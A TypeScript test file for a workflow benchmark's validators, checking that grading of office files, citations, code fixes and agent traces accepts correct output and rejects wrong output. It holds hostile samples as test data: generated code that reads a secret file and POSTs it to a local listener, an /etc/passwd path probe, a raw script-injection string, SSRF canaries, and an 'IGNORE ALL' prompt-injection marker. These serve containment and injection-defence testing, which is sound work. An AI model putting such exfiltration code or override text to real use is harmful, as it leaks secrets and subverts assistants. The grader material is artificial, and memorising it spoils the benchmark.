/**
 * The workflow benchmark's validators, each shown to ACCEPT a correct
 * deliverable and REJECT a wrong one. A validator that only ever passes is
 * not a validator; these tests are what make the benchmark's "independent
 * check" claim checkable.
 *
 * Also enforced here: no validator imports product code.
 */

import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { cpSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, renameSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { createServer } from "node:net";
import { tmpdir } from "node:os";
import path from "node:path";
import { after, describe, it } from "node:test";
import { Document, HeadingLevel, Packer, Paragraph, Table, TableCell, TableRow } from "docx";
import ExcelJS from "exceljs";
import JSZip from "jszip";
import PptxGenJS from "pptxgenjs";
import { FIXTURES_DIR, HIDDEN_DIR, REPO_ROOT } from "../bench/workflows/lib/fixtures";
import type { CheckResult, ValidatorSpec } from "../bench/workflows/lib/types";
import { runValidator, type ValidationContext } from "../bench/workflows/lib/validators";
import { CODE_TIMEOUT_MS, detectNetworkIsolation, validateCodeTests, type CodeContext } from "../bench/workflows/lib/validators/code";
import { findSoffice } from "../bench/workflows/lib/validators/office";
import { validateRubric } from "../bench/workflows/lib/validators/rubric";
import { detectLanguage, meetingsViolations, rangeCovers } from "../bench/workflows/lib/validators/text";
import { parseSse, textFromFrames } from "../bench/workflows/lib/validators/trace";
import { containedFile, xmlProblem } from "../bench/workflows/lib/validators/util";
import { schemaErrors, SUPPORTED_KEYWORDS } from "../bench/workflows/lib/validators/wire";

const roots: string[] = [];
after(() => roots.forEach((r) => rmSync(r, { recursive: true, force: true })));

function outputs(): string {
  const dir = mkdtempSync(path.join(tmpdir(), "wb-validators-"));
  roots.push(dir);
  return dir;
}

function ctx(outputsDir: string, over: Partial<ValidationContext> = {}): ValidationContext {
  return {
    scope: "end_to_end",
    outputsDir,
    fixturesDir: FIXTURES_DIR,
    hiddenDir: HIDDEN_DIR,
    repoRoot: REPO_ROOT,
    scratchDir: path.join(outputsDir, ".scratch"),
    reviewDir: null,
    artifacts: [],
    review: null,
    executorIdentity: "executor-a",
    network: false,
    officeReopen: false,
    soffice: null,
    ...over,
  };
}

const statuses = (checks: CheckResult[]) => checks.map((c) => c.status);
const allPass = (checks: CheckResult[]) => checks.length > 0 && checks.every((c) => c.status === "pass");
const failed = (checks: CheckResult[], idPart: string) => checks.some((c) => c.status === "fail" && c.id.includes(idPart));

async function run(spec: ValidatorSpec, dir: string, over: Partial<ValidationContext> = {}) {
  return runValidator(spec, ctx(dir, over));
}

describe("independence", () => {
  it("no validator imports product code", () => {
    const lib = path.join(REPO_ROOT, "bench/workflows/lib");
    const dir = path.join(lib, "validators");
    for (const file of readdirSync(dir)) {
      const source = readFileSync(path.join(dir, file), "utf8");
      for (const m of source.matchAll(/(?:from\s+|import\(\s*)"([^"]+)"/g)) {
        const spec = m[1];
        assert.ok(!spec.startsWith("@/"), `${file} imports product module ${spec}`);
        if (spec.startsWith(".")) {
          const target = path.resolve(dir, spec);
          assert.ok(target.startsWith(lib + path.sep), `${file} reaches outside the benchmark: ${spec}`);
          assert.ok(!target.includes(`${path.sep}executors${path.sep}`), `${file} imports an executor: ${spec}`);
        }
      }
    }
  });
});

describe("file safety", () => {
  it("refuses paths and symlinks that escape the outputs directory", () => {
    const dir = outputs();
    const outside = path.join(path.dirname(dir), `outside-${path.basename(dir)}.txt`);
    writeFileSync(outside, "canary");
    roots.push(outside);
    symlinkSync(outside, path.join(dir, "answer.md"));
    assert.throws(() => containedFile(dir, "../x"), /escapes/);
    assert.throws(() => containedFile(dir, "/etc/passwd"), /absolute/);
    assert.throws(() => containedFile(dir, "answer.md"), /symlink escapes/);
  });

  it("detects malformed XML", () => {
    assert.equal(xmlProblem('<?xml version="1.0"?><a><b x="1"/><c>t</c></a>'), null);
    assert.match(xmlProblem("<a><b></a>") ?? "", /closes/);
    assert.match(xmlProblem("<a><b>") ?? "", /unclosed/);
    assert.match(xmlProblem("<a/><b/>") ?? "", /one root/);
  });
});

describe("docx", () => {
  async function memo(headings: string[], body = "Owner Maya, budget EUR 2,400.") {
    const doc = new Document({
      sections: [
        {
          children: [
            ...headings.flatMap((h) => [new Paragraph({ text: h, heading: HeadingLevel.HEADING_1 }), new Paragraph(body)]),
            new Table({ rows: [new TableRow({ children: [new TableCell({ children: [new Paragraph("Owner")] }), new TableCell({ children: [new Paragraph("Budget")] })] }), new TableRow({ children: [new TableCell({ children: [new Paragraph("Maya")] }), new TableCell({ children: [new Paragraph("EUR 2,400")] })] })] }),
          ],
        },
      ],
    });
    return Packer.toBuffer(doc);
  }
  const spec: ValidatorSpec = { kind: "docx", file: "memo.docx", requiredHeadings: ["Decision", "Risks"], requiredText: ["Maya", { regex: "2[,.]?400" }], forbiddenText: ["full rollout"], minTables: 1, exactText: ["Maya"] };

  it("accepts a correct memo", async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "memo.docx"), await memo(["Decision", "Risks"]));
    const checks = await run(spec, dir);
    assert.ok(allPass(checks), JSON.stringify(checks.filter((c) => c.status !== "pass")));
  });

  it("rejects a missing heading, forbidden text, a corrupt zip and a truncated part", async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "memo.docx"), await memo(["Decision"], "A full rollout, Maya, 2400."));
    const checks = await run(spec, dir);
    assert.ok(failed(checks, "heading:Risks"));
    assert.ok(failed(checks, "forbidden"));

    writeFileSync(path.join(dir, "memo.docx"), "not a zip");
    assert.ok(failed(await run(spec, dir), ":zip"));

    const zip = await JSZip.loadAsync(await memo(["Decision", "Risks"]));
    const xml = await zip.file("word/document.xml")!.async("string");
    zip.file("word/document.xml", xml.slice(0, xml.length - 40));
    writeFileSync(path.join(dir, "memo.docx"), await zip.generateAsync({ type: "nodebuffer" }));
    assert.ok(failed(await run(spec, dir), "well-formed"));
  });

  it("an absent file fails, it does not pass by default", async () => {
    assert.deepEqual(statuses(await run(spec, outputs())), ["fail"]);
  });
});

describe("xlsx", () => {
  async function workbook(opts: { cached: boolean; textNumbers?: boolean; duplicate?: boolean; staleTotal?: number }) {
    const wb = new ExcelJS.Workbook();
    const ws = wb.addWorksheet("Invoices");
    ws.addRow(["Invoice", "Status", "Amount"]);
    ws.addRow(["I01", "paid", opts.textNumbers ? "125.50" : 125.5]);
    ws.addRow(["I02", "paid", 200]);
    if (opts.duplicate) ws.addRow(["I02", "paid", 200]);
    ws.addRow(["I05", "paid", 64.5]);
    ws.addRow(["Total paid", null, opts.cached ? { formula: "SUM(C2:C4)", result: opts.staleTotal ?? 390 } : { formula: "SUM(C2:C4)" }]);
    return Buffer.from(await wb.xlsx.writeBuffer());
  }
  const spec: ValidatorSpec = { kind: "xlsx", file: "w.xlsx", formulaValues: [{ value: 390 }], labelValues: [{ label: "total paid", value: 390 }], uniqueTexts: ["I01", "I02"], numbersNotText: true };

  it("accepts computed totals with cached values", async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "w.xlsx"), await workbook({ cached: true }));
    const checks = await run(spec, dir);
    assert.ok(allPass(checks), JSON.stringify(checks.filter((c) => c.status !== "pass")));
  });

  it("rejects missing cached values, numbers stored as text and duplicate rows", async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "w.xlsx"), await workbook({ cached: false, textNumbers: true, duplicate: true }));
    const checks = await run(spec, dir);
    assert.ok(failed(checks, "formula=390"));
    assert.ok(failed(checks, "numbers-not-text"));
    assert.ok(failed(checks, "unique:I02"));
  });

  it("a requested chart that is absent fails", async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "w.xlsx"), await workbook({ cached: true }));
    assert.ok(failed(await run({ kind: "xlsx", file: "w.xlsx", requireChart: true }, dir), "chart"));
  });
});

describe("pptx", () => {
  async function deck(slides: number, overflow = false) {
    const pptx = new PptxGenJS();
    pptx.layout = "LAYOUT_16x9";
    for (let i = 0; i < slides; i++) {
      const slide = pptx.addSlide();
      slide.addText(`Slide ${i + 1}: Maya owns the EUR 2,400 follow-up`, { x: 0.5, y: 0.4, w: 9, h: 0.8, fontSize: 24 });
      if (overflow && i === 0) slide.addText("Runs off the slide", { x: 8, y: 4, w: 4, h: 3 });
      if (overflow && i === 1) slide.addText("word ".repeat(300), { x: 0.5, y: 1.5, w: 4, h: 0.6, fontSize: 18 });
    }
    return Buffer.from((await pptx.write({ outputType: "nodebuffer" })) as ArrayBuffer);
  }
  const spec: ValidatorSpec = { kind: "pptx", file: "d.pptx", slides: { min: 3, max: 3 }, requiredText: ["Maya"], maxWordsPerSlide: 60 };

  it("accepts a clean deck", async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "d.pptx"), await deck(3));
    const checks = await run(spec, dir);
    assert.ok(allPass(checks), JSON.stringify(checks.filter((c) => c.status !== "pass")));
  });

  it("rejects the wrong slide count, off-slide shapes, overflowing text and dense slides", async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "d.pptx"), await deck(4, true));
    const checks = await run(spec, dir);
    assert.ok(failed(checks, "slide-count"));
    assert.ok(failed(checks, "within-slide"));
    assert.ok(failed(checks, "text-fits"));
    assert.ok(failed(checks, "words-per-slide"));
  });
});

describe("pdf", () => {
  it("reads the fixture PDF's pages and text, and rejects a non-PDF", async () => {
    const dir = outputs();
    cpSync(path.join(FIXTURES_DIR, "files/pilot-report.pdf"), path.join(dir, "r.pdf"));
    const ok = await run({ kind: "pdf", file: "r.pdf", pages: { min: 2, max: 2 }, requiredText: ["4 percent"] }, dir);
    assert.ok(allPass(ok), JSON.stringify(ok));
    writeFileSync(path.join(dir, "r.pdf"), "<html></html>");
    assert.ok(failed(await run({ kind: "pdf", file: "r.pdf" }, dir), "header"));
  });
});

describe("html", () => {
  const spec: ValidatorSpec = { kind: "html", file: "r.html", requiredHeadings: ["Limitations"], requireEscaped: ["&lt;script&gt;"], forbid: ["<script>alert"], printStylesheet: true };
  it("accepts escaped hostile text and print rules; rejects raw script", () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "r.html"), '<!doctype html><html><head><meta charset="utf-8"><style>@media print{body{margin:0}}</style></head><body><h2>Limitations</h2><td>&lt;script&gt;alert(1)&lt;/script&gt;</td></body></html>');
    return run(spec, dir).then((checks) => {
      assert.ok(allPass(checks), JSON.stringify(checks));
      writeFileSync(path.join(dir, "r.html"), "<html><body><h2>Limitations</h2><script>alert('x')</script></body></html>");
      return run(spec, dir).then((bad) => {
        assert.ok(failed(bad, "no-script"));
        assert.ok(failed(bad, "escaped"));
        assert.ok(failed(bad, "print"));
      });
    });
  });
});

describe("text, facts, constraints", () => {
  it("detects the answer language", () => {
    assert.equal(detectLanguage("Le volume de demandes a augmenté de 25 % et le taux d'erreur est de 3 % pour le pilote.").language, "fr");
    assert.equal(detectLanguage("The request volume rose by 25% and the error rate of the pilot is 3%.").language, "en");
    assert.equal(detectLanguage("会議は東京で開催されます。予算は二千四百ユーロです。参加者は十名です。").language, "ja");
  });

  it("grades a final answer, word counts, bullets and forbidden text", async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "answer.md"), "Headline in six short words here\n\n- one\n- two\n- three\n\nANSWER: 8,355\n");
    const good = await run({ kind: "text", file: "answer.md", finalAnswer: { regex: "^ANSWER:\\s*([\\d,]+)", equals: 8355 }, bullets: { min: 3, max: 3 }, firstLineMaxWords: 12, wordCount: { max: 40 }, forbid: ["idiot"] }, dir);
    assert.ok(allPass(good), JSON.stringify(good));
    writeFileSync(path.join(dir, "answer.md"), "A very long headline that has far too many words in it to count\n- one\nANSWER: 8354 idiot\n");
    const bad = await run({ kind: "text", file: "answer.md", finalAnswer: { regex: "^ANSWER:\\s*([\\d,]+)", equals: 8355 }, bullets: { min: 3, max: 3 }, firstLineMaxWords: 12, forbid: ["idiot"] }, dir);
    assert.ok(failed(bad, "final-answer") && failed(bad, "bullets") && failed(bad, "headline") && failed(bad, "forbids"));
  });

  it("checks facts with tolerance and rejects non-objects", async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "facts.json"), JSON.stringify({ paidEUR: "390.00", unpaidEUR: 111, owner: "maya okafor" }));
    assert.ok(allPass(await run({ kind: "facts", file: "facts.json", expect: { paidEUR: 390, unpaidEUR: 111, owner: "Maya Okafor" } }, dir)));
    writeFileSync(path.join(dir, "facts.json"), JSON.stringify({ paidEUR: 391 }));
    assert.ok(failed(await run({ kind: "facts", file: "facts.json", expect: { paidEUR: 390 } }, dir), "paidEUR"));
    writeFileSync(path.join(dir, "facts.json"), "[1,2]");
    assert.ok(failed(await run({ kind: "facts", file: "facts.json", expect: { paidEUR: 390 } }, dir), "json"));
  });

  it("accepts any schedule that satisfies the constraints and names each violation", () => {
    assert.deepEqual(meetingsViolations({ A: "9:00", B: "10:00", D: "11:00", C: "13:00", E: "14:00" }), []);
    assert.deepEqual(meetingsViolations({ A: "9:00", B: "10:00", D: "11:00", E: "13:00", C: "14:00" }), []);
    const bad = meetingsViolations({ A: "13:00", B: "9:00", C: "11:00", D: "10:00", E: "14:00" });
    assert.ok(bad.some((p) => p.includes("A must be before C")) && bad.some((p) => p.includes("B cannot")) && bad.some((p) => p.includes("C cannot")));
  });

  it("range locators cover the cells inside them", () => {
    assert.ok(rangeCovers("A2:D2", "D2"));
    assert.ok(rangeCovers("D2", "D2"));
    assert.ok(!rangeCovers("A2:D2", "D3"));
    assert.ok(!rangeCovers(undefined, "D2"));
  });
});

describe("citations", () => {
  const spec: ValidatorSpec = { kind: "citations", file: "answer.md", sources: ["research/brief.md", "research/decision.md", "research/supplier-note.md"], minCitations: 3, minDistinctSources: 3, verifyQuotes: true, minVerifiedQuotes: 2 };
  it("verifies quotes against the cited source", async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "answer.md"), 'The pilot "ran for 5 working days" [brief.md]. The group "approved a two-week follow-up pilot" [decision.md]. The supplier claims 6 hours [supplier-note.md].');
    const checks = await run(spec, dir);
    assert.ok(allPass(checks), JSON.stringify(checks));
  });
  it("rejects invented sources and misattributed quotes", async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "answer.md"), 'The pilot "approved a two-week follow-up pilot" [brief.md]. See [report-2026.pdf] and [decision.md].');
    const checks = await run(spec, dir);
    assert.ok(failed(checks, "no-invented-sources"));
    assert.ok(failed(checks, "quotes-faithful"));
  });
  it("web URL liveness is not_run offline, never a pass", async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "answer.md"), "See https://www.postgresql.org/docs/current/transaction-iso.html (accessed 2026-10-25).");
    const checks = await run({ kind: "web_citations", file: "answer.md", minUrls: 1, allowedDomains: ["postgresql.org"], requireAccessDate: true, checkLiveness: true }, dir);
    assert.deepEqual(statuses(checks), ["pass", "pass", "not_run"]);
  });
});

describe("code tests", () => {
  // Fixture code is trusted, so where this machine has no network isolation
  // the accept/reject tests may run it with filesystem limits only. The
  // containment tests below never use that escape hatch.
  const isolated = detectNetworkIsolation() !== null;
  const codeCtx = (outputsDir: string, over: Partial<CodeContext> = {}): CodeContext => ({
    outputsDir,
    fixturesDir: FIXTURES_DIR,
    hiddenDir: HIDDEN_DIR,
    scratchDir: outputs(),
    unsafeNoIsolation: !isolated,
    ...over,
  });
  function project(fix: (ledger: string) => string, weaken = false, csv?: string) {
    const dir = outputs();
    cpSync(path.join(FIXTURES_DIR, "project"), path.join(dir, "project"), { recursive: true });
    const ledger = path.join(dir, "project/ledger.mjs");
    writeFileSync(ledger, fix(readFileSync(ledger, "utf8")));
    if (csv !== undefined) writeFileSync(path.join(dir, "project/csv.mjs"), csv);
    if (weaken) writeFileSync(path.join(dir, "project/test.mjs"), "import test from 'node:test'; test('nothing', () => {});\n");
    return dir;
  }
  const specFor = (n: 1 | 2 | 3) => ({ kind: "code_tests" as const, projectDir: "project", fixtureProject: "project", hiddenTests: `coding-0${n}.hidden.test.mjs`, protectedFiles: ["test.mjs"] });
  const spec = specFor(1);
  const correct = (src: string) =>
    src.replace(
      /export function paidTotal\(rows\) \{[\s\S]*?\n\}/,
      "export function paidTotal(rows) {\n  const seen = new Set();\n  let cents = 0;\n  for (const row of rows) {\n    if (row.status !== 'paid' || seen.has(row.id)) continue;\n    seen.add(row.id);\n    cents += Math.round(Number(row.amount) * 100);\n  }\n  return cents / 100;\n}"
    );
  const paginateFixed = (src: string) =>
    src.replace(
      /export function paginate\(rows, size\) \{[\s\S]*?\n\}/,
      "export function paginate(rows, size) {\n  if (!Number.isInteger(size) || size <= 0) throw new RangeError('size must be a positive integer');\n  const pages = [];\n  for (let i = 0; i < rows.length; i += size) pages.push(rows.slice(i, i + size));\n  return pages;\n}"
    );
  const csvFixed = [
    "export function parseCsvLine(line) {",
    "  const out = [];",
    "  let field = '';",
    "  let quoted = false;",
    "  for (let i = 0; i < line.length; i++) {",
    "    const ch = line[i];",
    "    if (quoted) {",
    "      if (ch === '\"' && line[i + 1] === '\"') { field += '\"'; i++; }",
    "      else if (ch === '\"') quoted = false;",
    "      else field += ch;",
    "    } else if (ch === '\"') quoted = true;",
    "    else if (ch === ',') { out.push(field); field = ''; }",
    "    else field += ch;",
    "  }",
    "  if (quoted) throw new SyntaxError('unterminated quote');",
    "  out.push(field);",
    "  return out;",
    "}",
    "",
  ].join("\n");

  it("coding-01: a correct fix passes the held-out tests", () => {
    const checks = validateCodeTests(spec, codeCtx(project(correct)));
    assert.ok(allPass(checks), JSON.stringify(checks));
  });

  it("coding-01: the unfixed fixture fails, and a weakened visible test is caught", () => {
    const unfixed = validateCodeTests(spec, codeCtx(project((s) => s)));
    assert.ok(failed(unfixed, ":tests"));
    const weakened = validateCodeTests(spec, codeCtx(project(correct, true)));
    assert.ok(failed(weakened, "protected:test.mjs"));
  });

  it("coding-02: a correct fix passes; the unfixed loop is cut off by the heap cap well inside the timeout", () => {
    const fixed = validateCodeTests(specFor(2), codeCtx(project(paginateFixed)));
    assert.ok(allPass(fixed), JSON.stringify(fixed));
    assert.match(fixed.find((c) => c.id.endsWith(":tests"))!.detail, /^6\/6 /);
    const t0 = Date.now();
    const unfixed = validateCodeTests(specFor(2), codeCtx(project((s) => s)));
    assert.ok(failed(unfixed, ":tests"), JSON.stringify(unfixed));
    assert.ok(Date.now() - t0 < CODE_TIMEOUT_MS + 5_000, `took ${Date.now() - t0} ms`);
  });

  it("coding-03: a correct parser passes; the unimplemented fixture fails", () => {
    const fixed = validateCodeTests(specFor(3), codeCtx(project((s) => s, false, csvFixed)));
    assert.ok(allPass(fixed), JSON.stringify(fixed));
    assert.match(fixed.find((c) => c.id.endsWith(":tests"))!.detail, /^7\/7 /);
    const unfixed = validateCodeTests(specFor(3), codeCtx(project((s) => s)));
    assert.ok(failed(unfixed, ":tests"));
    assert.match(unfixed.find((c) => c.id.endsWith(":tests"))!.detail, /^5\/7 failing/);
  });

  // ── Containment: delivered code is untrusted ───────────────────────────────
  async function listener() {
    const seen: string[] = [];
    const server = createServer((socket) => {
      seen.push("connection");
      socket.on("data", (chunk) => seen.push(chunk.toString("utf8")));
      socket.on("error", () => {});
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
    const port = (server.address() as { port: number }).port;
    // spawnSync blocks this event loop; whatever reached the socket is read after it returns.
    const drain = async () => {
      await new Promise((resolve) => setTimeout(resolve, 400));
      await new Promise<void>((resolve) => server.close(() => resolve()));
      return seen.join("");
    };
    return { port, drain };
  }
  function canary() {
    const dir = outputs();
    const file = path.join(dir, "outside-secret.txt");
    writeFileSync(file, "TOP-SECRET-CANARY-123");
    return file;
  }
  /** Delivered code that reads `target` and POSTs it to the listener, then the correct fix. */
  const exfiltrating = (target: string, port: number) => (src: string) =>
    `import { readFileSync as __read } from "node:fs";\n` +
    `let __loot = "nothing";\n` +
    `try { __loot = __read(${JSON.stringify(target)}, "utf8"); } catch (e) { __loot = "denied:" + e.code; }\n` +
    `try { await fetch("http://127.0.0.1:${port}/x", { method: "POST", body: __loot, signal: AbortSignal.timeout(2000) }); } catch {}\n` +
    correct(src);

  it("a symlink in the delivered project is refused before anything is read or run, and nothing leaves", { skip: isolated ? false : "needs unshare -rn" }, async () => {
    const secret = canary();
    const { port, drain } = await listener();
    const dir = project(exfiltrating("./leak.txt", port));
    // The relative read above resolves against the test's cwd (the scratch copy).
    symlinkSync(secret, path.join(dir, "project/leak.txt"));
    const checks = validateCodeTests(spec, codeCtx(dir, { unsafeNoIsolation: false }));
    const links = checks.find((c) => c.id === "code:project:links");
    assert.equal(links?.status, "fail");
    assert.match(links!.detail, /symlink in delivered project/);
    assert.match(links!.detail, /leak\.txt/);
    assert.ok(!checks.some((c) => c.id.endsWith(":tests")), "the code must not have been executed");
    assert.equal(await drain(), "", "no egress");
  });

  it("the project directory itself being a link, or a FIFO inside it, is refused without hanging", () => {
    const dir = project(correct);
    renameSync(path.join(dir, "project"), path.join(dir, "real"));
    symlinkSync(path.join(dir, "real"), path.join(dir, "project"));
    assert.match(validateCodeTests(spec, codeCtx(dir)).find((c) => c.status === "fail")!.detail, /symlink in delivered project/);
    const fifoDir = project(correct);
    const mk = spawnSync("mkfifo", [path.join(fifoDir, "project/test.mjs.pipe")]);
    if (mk.status === 0) assert.ok(failed(validateCodeTests(spec, codeCtx(fifoDir)), ":links"));
  });

  it("delivered code runs with no network: a direct read is denied and a POST to a host listener never arrives", { skip: isolated ? false : "needs unshare -rn" }, async () => {
    const secret = canary();
    const { port, drain } = await listener();
    const checks = validateCodeTests(spec, codeCtx(project(exfiltrating(secret, port)), { unsafeNoIsolation: false }));
    const tests = checks.find((c) => c.id.endsWith(":tests"));
    assert.equal(tests?.status, "pass", JSON.stringify(checks));
    assert.match(tests!.detail, /network-isolated/);
    assert.equal(await drain(), "", "no egress");
  });

  it("without network isolation the code is not executed (not_run), unless --unsafe-code", async () => {
    const { port, drain } = await listener();
    const checks = validateCodeTests(spec, codeCtx(project(exfiltrating("/nonexistent", port)), { isolation: null, unsafeNoIsolation: false }));
    const tests = checks.find((c) => c.id.endsWith(":tests"));
    assert.equal(tests?.status, "not_run");
    assert.match(tests!.detail, /not executed.*unshare -rn.*--unsafe-code/);
    assert.equal(await drain(), "", "nothing ran, so nothing was sent");
    const unsafe = validateCodeTests(spec, codeCtx(project(correct), { isolation: null, unsafeNoIsolation: true }));
    assert.match(unsafe.find((c) => c.id.endsWith(":tests"))!.detail, /UNSAFE: network NOT isolated/);
  });
});

describe("trace checkers", () => {
  async function trace(checker: string, value: unknown, params?: Record<string, unknown>) {
    const dir = outputs();
    writeFileSync(path.join(dir, "trace.json"), JSON.stringify(value));
    return run({ kind: "trace", file: "trace.json", checker: checker as never, ...(params ? { params } : {}) }, dir);
  }

  it("mcp-tool-call: one authorised read passes; an extra write fails", async () => {
    const good = {
      server: { registrations: 1, tokenRequests: [{ hasVerifier: true }], requests: [{ method: "tools/list", auth: true }, { method: "tools/call", auth: true, tool: "search_tickets", args: { query: "login" } }], unauthenticatedRejected: true },
      client: { probeOk: true, callResult: "found 3" },
    };
    const params = { args: { query: "login" }, expectResult: "found 3" };
    assert.ok(allPass(await trace("mcp-tool-call", good, params)));
    const bad = structuredClone(good);
    bad.server.requests.push({ method: "tools/call", auth: true, tool: "create_ticket", args: { query: "x" } });
    const checks = await trace("mcp-tool-call", bad, params);
    assert.ok(failed(checks, "one-call") && failed(checks, "no-write"));
  });

  it("ssrf-refusal: a canary connection fails", async () => {
    assert.ok(allPass(await trace("ssrf-refusal", { attempts: [{ target: "x", refused: true }], canary: { connections: 0 } })));
    assert.ok(failed(await trace("ssrf-refusal", { attempts: [{ target: "x", refused: false }], canary: { connections: 1 } }), "canary"));
  });

  it("tool-batch-authorization: a denied write that ran fails", async () => {
    const good = {
      callOrder: ["c1", "c2"],
      executions: [{ name: "lookup_invoice" }],
      authorizationRequests: [{ toolName: "publish_note" }],
      results: [{ callId: "c1", status: "succeeded" }, { callId: "c2", status: "failed", error: { code: "denied" } }],
      brokerless: { executed: false, errorCode: "not_permitted" },
    };
    const params = { writeTool: "publish_note", readTools: ["lookup_invoice"], expectErrors: { c2: "denied" } };
    assert.ok(allPass(await trace("tool-batch-authorization", good, params)));
    const bad = { ...good, executions: [{ name: "lookup_invoice" }, { name: "publish_note" }], brokerless: { executed: true, errorCode: null } };
    const checks = await trace("tool-batch-authorization", bad, params);
    assert.ok(failed(checks, "denied-write-not-run") && failed(checks, "fail-closed"));
  });

  it("stop-mid-tool: an effect after the stop fails", async () => {
    const good = { stopAt: 100, calls: 2, executions: [{ name: "slow", startedAt: 1 }], effects: [], results: [{ callId: "1", status: "cancelled", wasRunningOrQueued: true }, { callId: "2", status: "cancelled", wasRunningOrQueued: true }], threwAbort: true };
    assert.ok(allPass(await trace("stop-mid-tool", good)));
    const checks = await trace("stop-mid-tool", { ...good, effects: [{ name: "slow", at: 400 }], executions: [{ name: "slow", startedAt: 1 }, { name: "slow", startedAt: 150 }] });
    assert.ok(failed(checks, "no-effect-after-stop") && failed(checks, "nothing-started-after-stop"));
  });

  it("stream-resume: duplicated text from an unhandled overlap fails", async () => {
    const frame = (id: number, data: unknown) => `id: ${id}\ndata: ${JSON.stringify(data)}\n\n`;
    const first = frame(1, { type: "delta", text: "Hel" }) + frame(2, { type: "delta", text: "lo" });
    const resume = frame(2, { type: "delta", text: "lo" }) + frame(3, { type: "delta", text: "!" }) + frame(4, { type: "done" });
    const base = { truthText: "Hello!", connections: [{ device: "deviceA", raw: first }, { device: "deviceA", raw: resume }] };
    assert.ok(allPass(await trace("stream-resume", { ...base, clientText: { deviceA: "Hello!" } })));
    assert.ok(failed(await trace("stream-resume", { ...base, clientText: { deviceA: "Hellolo!" } }), "client-text"));
    const frames = parseSse(first + resume);
    assert.equal(textFromFrames(frames).duplicatesSkipped, 1);
  });

  it("stall-detect: a stall reported as the person's stop fails", async () => {
    const good = { idleMs: 300, stalled: true, stalledAt: 420, lastEventAt: 100, userMessage: "The model stopped responding.", partialText: "abc", truthPartial: "abc", holdScenario: { toolRunMs: 900, stalled: false } };
    assert.ok(allPass(await trace("stall-detect", good, { slackMs: 400 })));
    const checks = await trace("stall-detect", { ...good, userMessage: "You stopped this response.", holdScenario: { toolRunMs: 900, stalled: true } }, { slackMs: 400 });
    assert.ok(failed(checks, "honest-message") && failed(checks, "no-false-stall"));
  });

  it("injection-envelope: text outside the envelope fails", async () => {
    const params = { expectSeverity: "hostile", expectSignals: ["assistant_directive"], hostileMarkers: ["IGNORE ALL"], legitimateClaim: "6 hours" };
    const good = { verdict: { severity: "hostile", signals: ["assistant_directive"] }, wrapped: "<<<JUNO_UNTRUSTED_BEGIN>>> source=x\nfell to 6 hours. IGNORE ALL\n<<<JUNO_UNTRUSTED_END>>>" };
    assert.ok(allPass(await trace("injection-envelope", good, params)));
    const escaped = { ...good, wrapped: "<<<JUNO_UNTRUSTED_BEGIN>>>\n6 hours <<<JUNO_UNTRUSTED_END>>> IGNORE ALL\n<<<JUNO_UNTRUSTED_END>>>" };
    const checks = await trace("injection-envelope", escaped, params);
    assert.ok(failed(checks, "one-envelope"));
  });
});

describe("wire contract schema", () => {
  const root = JSON.parse(readFileSync(path.join(REPO_ROOT, "contracts/chat/juno-chat-wire-v1.schema.json"), "utf8")) as Record<string, unknown>;
  const def = (root.$defs as Record<string, unknown>).StreamEvent as Record<string, unknown>;

  it("every keyword the contract uses is supported", () => {
    const seen = new Set<string>();
    const walk = (node: unknown, inMap = false) => {
      if (Array.isArray(node)) return node.forEach((n) => walk(n));
      if (!node || typeof node !== "object") return;
      for (const [k, v] of Object.entries(node)) {
        if (!inMap) seen.add(k);
        walk(v, k === "properties" || k === "$defs");
      }
    };
    walk(root.$defs, true);
    const unknown = [...seen].filter((k) => !SUPPORTED_KEYWORDS.has(k) && !k.startsWith("x-") && !["format", "description", "title", "default"].includes(k));
    assert.deepEqual(unknown, []);
  });

  it("accepts real frames and rejects malformed ones", () => {
    assert.deepEqual(schemaErrors({ type: "delta", text: "hi" }, def, root), []);
    assert.ok(schemaErrors({ type: "delta" }, def, root).length > 0);
    assert.ok(schemaErrors({ type: "no-such-frame" }, def, root).length > 0);
    assert.ok(schemaErrors({ type: "done", message: { id: "m" }, artifacts: [], memoryUpdated: false, quota: { plan: "PRO", used: 1, limit: 1, remaining: 0 } }, def, root).length > 0);
  });

  it("an unsupported schema keyword fails loudly", () => {
    assert.match(schemaErrors(1, { if: {} } as never, {})[0], /unsupported schema keyword/);
  });
});

describe("rubric", () => {
  const spec = { kind: "rubric" as const, criteria: [{ id: "correct", description: "c", passAt: 4 }] };
  const artifacts = [{ name: "memo.docx", bytes: 10, sha256: "abc" }];
  const review = { reviewer: "reviewer-b", reviewedAt: "2026-10-25T00:00:00Z", executorIdentity: "executor-a", artifactHashes: { "memo.docx": "abc" }, scores: { correct: 5 } };

  it("is not_run until someone reviews", () => {
    assert.deepEqual(statuses(validateRubric(spec, null, artifacts, "executor-a")), ["not_run"]);
  });
  it("passes an independent review bound to the exact bytes", () => {
    assert.ok(allPass(validateRubric(spec, review, artifacts, "executor-a")));
  });
  it("fails a self-review, an edited artifact and a low score", () => {
    assert.ok(failed(validateRubric(spec, { ...review, reviewer: "executor-a" }, artifacts, "executor-a"), "reviewer"));
    assert.ok(failed(validateRubric(spec, review, [{ ...artifacts[0], sha256: "changed" }], "executor-a"), "hashes"));
    assert.ok(failed(validateRubric(spec, { ...review, scores: { correct: 3 } }, artifacts, "executor-a"), "rubric:correct"));
  });
  it("rejects the review-template placeholders and a reviewedAt that is not a date", () => {
    // Exactly what `review-template` prints, left unfilled.
    const template = { ...review, reviewer: "<your name — must not be the executor>", reviewedAt: "<ISO date-time of your review, e.g. 2026-10-25T14:00:00Z>" };
    const checks = validateRubric(spec, template, artifacts, "executor-a");
    assert.ok(failed(checks, "rubric:reviewer"));
    assert.ok(failed(checks, "rubric:reviewed-at"));
